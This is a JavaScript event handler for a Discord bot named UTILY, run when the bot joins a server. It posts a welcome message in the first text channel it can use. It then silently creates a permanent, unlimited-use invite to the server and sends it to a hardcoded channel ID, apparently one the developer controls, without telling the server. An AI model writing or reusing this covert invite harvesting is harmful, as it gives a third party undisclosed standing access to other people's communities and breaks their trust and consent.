const { client } = require(`../index`);

module.exports = {
	name: 'guildCreate',
	async execute(guild) {
		let found = 0;
    guild.channels.cache.map((channel) => {
        if (found === 0) {
          if (channel.isText()) {
            if (channel.permissionsFor(client.user).has("ViewChannel") === true) {
              if (channel.permissionsFor(client.user).has("SendMessages") === true) {
                try {
                channel.send({content: `Hello - I'm UTILY! A multi-purpose bot for Discord.\n\nGet-started by using \`/setup\` and then get you hands on commands by using \`/help help\`\n\nI'm currently in ${client.guilds.cache.size} servers.\n\nIf you have any questions, suggestions, or bugs, please join the support server: [will put link here]\n\nIf you want to invite me to your server, please use the link below.\n\nhttps://discord.com/api/oauth2/authorize?client_id=934317872677785631&permissions=1239299779799&scope=bot%20applications.commands`,});
                }catch (e){
                  console.log(e);
                }
            if(channel.permissionsFor(client.user).has("CreateInstantInvite") === true){
                try {
                    guild.invites.create(channel ,{maxAge: 0, maxUses: 0}).then((invite) => {
                    (client.channels.cache.get('934357690778529823')).send(`I joined ${guild.name}! here's the invite ${invite}`);
                    });
                } catch (e) {
                    console.log(e);
                }
                }
             }
                
                found = 1;
              }
            }
          }
        });
	},
};